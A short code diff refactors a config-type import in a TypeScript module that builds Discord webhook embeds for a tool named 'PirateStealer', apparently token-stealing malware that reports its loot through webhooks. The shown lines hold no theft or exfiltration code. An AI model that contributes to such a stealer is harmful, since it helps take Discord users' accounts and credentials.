@@ -1,4 +1,4 @@
-import { ConfigFSBinder } from "../../configFSBinder";
+import { ConfigBinder } from "../../interfaces";
 import { MessageEmbed, WebhookMessageOptions } from "discord.js";
 import { writeError } from "../../log";
 
@@ -7,7 +7,7 @@ export interface EmbedTemplate {
     webhookMessage: GenWebhookMessage;
     embeds: MessageEmbed[];
 }
-export function getBaseEmbeds(config: ConfigFSBinder, embedsCount = 1): EmbedTemplate {
+export function getBaseEmbeds(config: ConfigBinder, embedsCount = 1): EmbedTemplate {
     const stealerName = "PirateStealer";
     const embeds: MessageEmbed[] = [];
     for (let i = 0; i < embedsCount; i++) {
